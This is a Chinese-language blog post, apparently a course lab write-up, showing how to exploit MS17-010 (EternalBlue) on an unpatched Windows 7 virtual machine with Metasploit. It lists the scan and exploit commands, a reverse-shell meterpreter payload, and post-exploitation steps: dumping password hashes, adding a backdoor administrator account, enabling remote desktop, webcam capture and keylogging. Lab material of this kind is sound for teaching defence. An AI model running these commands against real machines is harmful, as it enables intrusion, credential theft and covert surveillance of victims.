


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,inital-scale=1,user-scalable=no">
  <title>永恒之蓝（有图） [ Hexo ]</title>
  <!-- bootstrapcss文件 -->
 <!--  <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"> -->
<!--   
<link rel="stylesheet" href="/css/zhl.css">

 -->
  
    <!-- stylesheets list from config.yml -->
    
      <link rel="stylesheet" href="/css/fork-awesome.min.css">
    
      <link rel="stylesheet" href="/css/zhl.css">
    
  
  
<meta name="generator" content="Hexo 6.3.0"></head>
<body>
<div class="container-fluid">
  <div class="row">
  <div id="wrap" class="col-md-12">
    <div id="header">
	<div id="header-left">
	<h1 id="header-title"> 
	<a href="/">
		Hexo
	</a>
	</h1>
	
	</div>
	<div id="header-right">
		
		
		<a href="/"  title="home"><i class="fa fa-home ">home</i></a>
		
		<a target="_blank" rel="noopener" href="https://github.com/lizehongss/demo_show"  title="demo"><i class="fa fa-code ">demo</i></a>
		
		<a href="/about"  title="about"><i class="fa fa-user ">about</i></a>
		
		<a href="/"  title="music"><i class="fa fa-music ">music</i></a>
		
		
	</div>
</div>

  </div>
  </div>
  <div id="content" class="row">
    <div id="content-left" class="col-md-4">
      

	

	
	<div class="widget-wrap">
		<h3 class="widget-title fa fa-tags">标签</h3>
		<div class="widget tags">
		<a class="tag-span-link" href="/tags/ACL/" rel="tag">ACL<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/ARP%E6%8A%93%E5%8C%85/" rel="tag">ARP抓包<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/HTML/" rel="tag">HTML<span class="tag-span-count">3</span></a> <a class="tag-span-link" href="/tags/STP/" rel="tag">STP<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE/" rel="tag">Typora快捷键<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/VLAN/" rel="tag">VLAN<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集<span class="tag-span-count">3</span></a> <a class="tag-span-link" href="/tags/%E5%85%B3%E4%BA%8E%E4%B8%BB%E9%A2%98/" rel="tag">关于主题<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E5%88%86%E4%BA%AB%E7%AC%94%E8%AE%B0/" rel="tag">分享笔记<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" rel="tag">搭建博客<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" rel="tag">数据通信网络基础<span class="tag-span-count">6</span></a> <a class="tag-span-link" href="/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/" rel="tag">永恒之蓝<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/" rel="tag">链路聚合<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/" rel="tag">静态路由<span class="tag-span-count">1</span></a>
		</div>
	</div>


	
	<div class="widget-wrap">
		<h3 class="widget-title fa fa-archive">归档</h3>
		<div class="widget">
			<ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">28</span></li></ul>
		</div>
	</div>



    </div>
    <div id="content-right" class="col-md-8">
    
<article id="post">
	<div class="post-title">
  <h1>永恒之蓝（有图）</h1>
  	</div>
  <div class="page-meta">
  	<span class="fa-wrap">
  		<i class="fa fa-clock-o"></i>
  		<span class="date-meta">2023-07-29</span>
  	</span>
  	<span class="fa-wrap">
  		
  		<i class="fa fa-tags"></i>
  		<span class="tags-meta">永恒之蓝</span>
  		
  	</span>
  	<span class="fa-wrap">
  		
  	</span>
  </div>
  <div class="post-content">
  <h2 id="一、实训目的："><a href="#一、实训目的：" class="headerlink" title="一、实训目的："></a>一、实训目的：</h2><p> 熟悉Metasploit终端的使用方法</p>
<p> 掌握对MS17-010漏洞攻击的方法。</p>
<h2 id="二、场景描述："><a href="#二、场景描述：" class="headerlink" title="二、场景描述："></a>二、场景描述：</h2><p>在虚拟机环境下配置 “Win7”和“Kali Linux”虚拟系统，使得2个系统之间能够相互通信。通过ARP中间人欺骗，使Kali主机成为目标主机和网关的中间人，然后捕获目标主机Win7的网络数据，网络拓扑如图所示。</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163029102.png" alt="image-20230729163029102"></p>
<h2 id="三、实验环境："><a href="#三、实验环境：" class="headerlink" title="三、实验环境："></a>三、实验环境：</h2><p>\1.   软件：VMware Workstations14以上版本</p>
<p>\2.   虚拟机：Kali-Linux、Windows 7 </p>
<ol>
<li><p>打开虚拟机：启动kali-linux 启动windows7（未装补丁）</p>
</li>
<li><p>获取IP地址（ifconfig、ipconfig）</p>
</li>
</ol>
<p>Kali-Linux ：192.168.100.100</p>
<p>Windows 7： 192.168.100.128</p>
<p>在虚拟机环境下配置 “Win7”和“Kali Linux”2个虚拟系统，使得虚拟系统之间能够相互通信。</p>
<h3 id="（一）环境部署"><a href="#（一）环境部署" class="headerlink" title="（一）环境部署"></a>（一）环境部署</h3><h4 id="1、知识点补充：VMWare虚拟机网络配置"><a href="#1、知识点补充：VMWare虚拟机网络配置" class="headerlink" title="1、知识点补充：VMWare虚拟机网络配置"></a>1、知识点补充：VMWare虚拟机网络配置</h4><p>1）Bridged（桥接模式）</p>
<p>桥接模式相当于虚拟机和主机在同一个真实网段，VMWare充当一个集线器功能（一根网线连到主机相连的路由器上），所以如果电脑换了内网，静态分配的ip要更改。图如下：</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163123357.png" alt="image-20230729163123357"></p>
<p>注：桥接模式是通过虚拟网桥将主机上的网卡与虚拟交换机Vmnet0连接在一起，虚拟机上的虚拟网卡(并不是VMware Network AdaptervMnet1和VMware Network Adapter VMnet8）都连接在虚拟交换机Vmneto上，所以桥接模式的虚拟机IP必须与主机在同一网段且子网掩码、网关与DNS也要与主机网卡一致。</p>
<p>2）NAT（网络地址转换模式）</p>
<p>NAT模式和桥接模式一样可以上网，只不过，虚拟机会虚拟出一个内网，主机和虚拟机都在这个虚拟的局域网中。NAT中VMWare相当于交换机（产生一个局域网，在这个局域网中分别给主机和虚拟机分配ip地址）</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163145949.png" alt="image-20230729163145949"></p>
<p>注：在连接Vmnet8虚拟交换机时，虚拟机会将虚拟NAT设备及虚拟DHCP服务器连接到Vmnet8虚拟交换机上，同时也会将主机上的虚拟网卡VMwareNetwork Adapter VMnet8连接到Vmnet8虚拟交换机上。虚拟网卡VMwareNetwork Adapter VMnet8只是作为主机与虚拟机通信的接口，虚拟机并不是依靠虚拟网卡vMware Network Adapter VMnet8来联网的。</p>
<h4 id="2、配置步骤："><a href="#2、配置步骤：" class="headerlink" title="2、配置步骤："></a>2、配置步骤：</h4><p>步骤1：设置VMVare的默认网关（相当于我们设置路由器）: </p>
<p>编辑–&gt;虚拟网络编辑器</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163215118.png" alt="image-20230729163215118"></p>
<p>步骤2：在虚拟网络编辑器中，更改设置–&gt;选中VM8&gt;点击NAT设置，设置默认网关为192.168.182.2。</p>
<h2 id="四、实验步骤"><a href="#四、实验步骤" class="headerlink" title="四、实验步骤"></a>四、实验步骤</h2><h3 id="1、利用MS17-010漏洞渗透目标主机"><a href="#1、利用MS17-010漏洞渗透目标主机" class="headerlink" title="1、利用MS17-010漏洞渗透目标主机"></a>1、利用MS17-010漏洞渗透目标主机</h3><p>步骤1：查看Kali Linux和Windows7的IP地址，确保两台主机能相互访问</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163239771.png" alt="image-20230729163239771"></p>
<p>步骤2：kali-linux输入msfconsole启动msf（若不是root登陆需sudo提升权限）</p>
<p>#msfconsole启动metasploit，命令提示行显示msf则启动成功。</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163256196.png" alt="image-20230729163256196"></p>
<p>步骤3：搜索漏洞模块，使用search命令，search ms17-010，下图所示：</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163326705.png" alt="image-20230729163326705"></p>
<p>步骤4-1：使用“永恒之蓝”的漏洞模块，使用扫描命令进行网段内主机扫描，扫描命令：use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</p>
<p>命令如下：</p>
<p>msf6 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010   &#x2F;&#x2F;进入扫描模块</p>
<p>msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.100.0&#x2F;24</p>
<p>&#x2F;&#x2F;扫描192.168.100.0&#x2F;24网段内的主机   </p>
<p>msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 512  &#x2F;&#x2F;设置扫描线程（值越大扫描速度越快）</p>
<p>msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run   &#x2F;&#x2F;执行</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163348776.png" alt="image-20230729163348776"></p>
<p>步骤5-1：进行攻击：use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalbluesy设置攻击主机和靶机的ip地址，使用set命令，如下所示：</p>
<p>设置攻击目标（靶机）：set rhost 192.168.100.128</p>
<p>设置监听主机（kali）：set lhost 192.168.100.100</p>
<p>设置攻击载荷：set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p>
<p>利用exploit进行攻击：run或者exploit</p>
<p>注：rhosts（ remoter hosts） 目标机、 lhost（ local host） 原始攻击机</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163410058.png" alt="image-20230729163410058"></p>
<p>步骤5-3：设置反向监听，开始后渗透靶机，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163426099.png" alt="image-20230729163426099"></p>
<p>步骤5-4：开始攻击，使用run或者exploit命令，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163439906.png" alt="image-20230729163439906"></p>
<p>步骤5-5：显示win时表示成功，此时已成功渗透目的主机，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163458030.png" alt="image-20230729163458030"></p>
<p>注：会出现meterpreter是Metasploit的一个扩展模块，可以调用Metasploit的一些功能，对目标系统进行入的渗透，如获取屏幕、上传&#x2F;下载文件、创建持久后门等。</p>
<h3 id="2、利用MS17-010漏洞，对目标系统进行渗透"><a href="#2、利用MS17-010漏洞，对目标系统进行渗透" class="headerlink" title="2、利用MS17-010漏洞，对目标系统进行渗透"></a>2、利用MS17-010漏洞，对目标系统进行渗透</h3><h4 id="漏洞利用1：成功获得管理员权限"><a href="#漏洞利用1：成功获得管理员权限" class="headerlink" title="漏洞利用1：成功获得管理员权限"></a>漏洞利用1：成功获得管理员权限</h4><p>1）显示远程主机系统信息： sysinfo</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163524315.png" alt="image-20230729163524315"></p>
<p>2）已成功获得windows管理员权限！</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163537751.png" alt="image-20230729163537751"></p>
<p>漏洞利用2：通过 meterpreter 获取屏幕快照： screenshot</p>
<h4 id="漏洞利用3：上传文件到Windows主机"><a href="#漏洞利用3：上传文件到Windows主机" class="headerlink" title="漏洞利用3：上传文件到Windows主机"></a>漏洞利用3：上传文件到Windows主机</h4><p>meterpreter &gt; upload &#x2F;home&#x2F;kali&#x2F;666.jpg c:\test.jpg   &#x2F;&#x2F;将&#x2F;home&#x2F;kali&#x2F;目录下的666.jpg文件上传到windows7主机中</p>
<p>上传文件到Windows主机</p>
<p>   meterpreter &gt; upload &#x2F;home&#x2F;kali&#x2F;666.jpg c:\666.jpg</p>
<h4 id="漏洞利用4：从Windows主机中下载文件到kali中"><a href="#漏洞利用4：从Windows主机中下载文件到kali中" class="headerlink" title="漏洞利用4：从Windows主机中下载文件到kali中"></a>漏洞利用4：从Windows主机中下载文件到kali中</h4><p>   meterpreter &gt; download d:\meishaonv.jpg &#x2F;root</p>
<p>漏洞利用5：利用刚拿到的shell执行权限提权，通过shell对靶机Win7进行控制</p>
<p>此时我们输入getuid查看权限得知权限为管理员权限</p>
<p>使用shell命令进入window7系统</p>
<p>meterpreter &gt; getuid</p>
<p>meterpreter &gt; hashdump</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163621079.png" alt="image-20230729163621079"></p>
<p>已成功获得windows登录用户名和密码</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163634566.png" alt="image-20230729163634566"></p>
<p>注：msf 在获取 shell 后为了更方便的进行渗透测试，可获取主机的 hash 以及域的 hash，即用户的密码，存在于 c 盘下的 windos 下的 system32 下的 config 下的 sam 文件中，以 hash 加密的方式存储，而系统开机后，hash 密码会以明文存在于内存中。</p>
<h4 id="漏洞利用5：通过-meterpreter-获取屏幕快照"><a href="#漏洞利用5：通过-meterpreter-获取屏幕快照" class="headerlink" title="漏洞利用5：通过 meterpreter 获取屏幕快照"></a>漏洞利用5：通过 meterpreter 获取屏幕快照</h4><p>meterpreter &gt; screenshot</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163702303.png" alt="image-20230729163702303"></p>
<h4 id="漏洞利用6：shell-新增账户并远程登陆目标主机"><a href="#漏洞利用6：shell-新增账户并远程登陆目标主机" class="headerlink" title="漏洞利用6：shell 新增账户并远程登陆目标主机"></a>漏洞利用6：shell 新增账户并远程登陆目标主机</h4><p>索性就利用刚拿到的shell执行权限提权，通过shell对靶机Win7进行控制</p>
<p>此时我们输入getuid查看权限得知权限为管理员权限</p>
<p>使用shell命令进入window7系统</p>
<p>meterpreter &gt; getuid</p>
<p>Server username: NT AUTHORITY\SYSTEM</p>
<p>meterpreter &gt; shell</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163738894.png" alt="image-20230729163738894"></p>
<p>C:\Windows\system32&gt;</p>
<p>C:\WINDOWS\system32&gt;net user admin admin &#x2F;add    &#x2F;&#x2F;新建用户admin 密码也是admin</p>
<p>C:\WINDOWS\system32&gt;net localgroup Administrators admin &#x2F;add    &#x2F;&#x2F;将admin用户添加到administrator组</p>
<p>C:\WINDOWS\system32&gt;net user admin &#x2F;active:yes    </p>
<p>开启远程管理服务</p>
<p>C:\Windows\system32&gt;reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</p>
<p>测试：通过物理机远程登录目标主机（windows7）</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163800241.png" alt="image-20230729163800241"></p>
<p>成功登录</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/image-20230729163817553.png" alt="image-20230729163817553"></p>
<h4 id="漏洞利用7：开启摄像头"><a href="#漏洞利用7：开启摄像头" class="headerlink" title="漏洞利用7：开启摄像头"></a>漏洞利用7：开启摄像头</h4><p>webcam_list –&gt;查看摄像头</p>
<p>webcam_snap –&gt;通过摄像头拍照</p>
<p>webcam_stream –&gt;通过摄像头开启视频</p>
<p><strong>漏洞利用<strong><strong>8</strong></strong>：键盘监听</strong></p>
<p>ps 看（explorer.exe）进程号</p>
<p>migrate 1892（进程号） 迁移</p>
<p>keyscan_start 键盘监听</p>
<p>keyscan_dump 看键盘输入了什么</p>
<p>…………</p>

	</div>
</article>



    </div>
  </div>
  <div class="row">
<div id="bottom" class="col-md-12"> 
  <div class="bottom-nav">
	
	
	<a href="https://github.com/lizehongss" class="fa fa-github fa-2x" target="_blank" title="Follow me" ></a>
	
	
</div>
<div class="bottom-info">
	&copy; 2023 John Doe<br>
	Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
	theme <a href="https://github.com/lizehongss/hexo-theme-zhl" target="_blank">zhl</a>
</div>
</div>
</div>
</div>
<div id="tool">
  <ul>
    <li class="fa fa-angle-up top" id="top"></li>
  </ul>
</div>
  <div class="bg_content">
    <canvas id="canvas"></canvas>
  </div>
  
  <!-- scripts list from theme config.yml -->
  
    <script src="/js/zhl.js"></script>
  
    <script src="/js/bj.js"></script>
  

<!-- jQ cdn  -->
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<!-- bootstrap js cdn-->
<!-- <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script> -->


</body>
</html>
